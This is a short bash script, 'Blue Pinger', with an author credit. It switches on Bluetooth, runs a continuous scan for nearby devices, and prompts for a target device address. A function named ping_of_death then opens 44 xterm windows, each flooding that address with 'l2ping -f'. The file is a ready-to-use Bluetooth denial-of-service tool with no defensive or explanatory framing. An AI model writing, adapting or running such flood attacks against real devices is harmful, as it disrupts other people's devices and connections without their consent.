# AUTHOR   : JAYSON CABRILLAS SAN BUENAVENTURA
# GITHUB   : https://github.com/mkdirlove
# FACEBOOK : https://web.facebook.com/mkdirlove.git

#!/usr/bin/bash

#COLORS
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
bln="\033[33m"
bc="\033[0m"

# Check if running as root.
function check_sudo() {
  if [[ "$EUID" -ne 0 ]]; then
    clear
    echo "    Blue Pinger" | figlet -f slant
    printf "%b\n" "ERROR!!! This script must be run as root. Use sudo." >&2
    exit 1
  fi
}

ping_of_death() 
{
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
}

echo "    Blue Pinger" | figlet -f slant     
echo ""
echo -e "$white        AUTHOR   : Jayson Cabrillas San Buenaventura"
echo -e "$white        GITHUB   : https://github.com/mkdirlove$nc"
echo -e "$white        FACEBOOK : https://web.facebook.com/mkdirlove.git$nc"
echo ""
check_sudo
sudo lsmod | grep blue &>/dev/null
systemctl enable bluetooth.service &>/dev/null
systemctl start bluetooth.service &>/dev/null

if rfkill unblock bluetooth ;then
sleep 3
 
echo -e "$red Bluetooth turned on!!!$nc"
else echo -e "Something went wrong!!!"
fi
echo -e ""

echo -e "$Cyan Scanning Bluetoothe Devices...$nc"
echo -e ""
xterm -hold -e 'while [ 1 ]; do hcitool scan ;done' &
read -p $'\033[1;33m[*]Enter target address (xx:xx:xx:xx:xx:xx) : \033[0m' bdadd
echo -e "" 
read -p $'\033[1;33m[*]Press ENTER to start.\033[0m'
ping_of_death

echo -e "$yellow Simple tool by: Jayson Cabrillas San Buenaventura (mkdirlove)$nc"
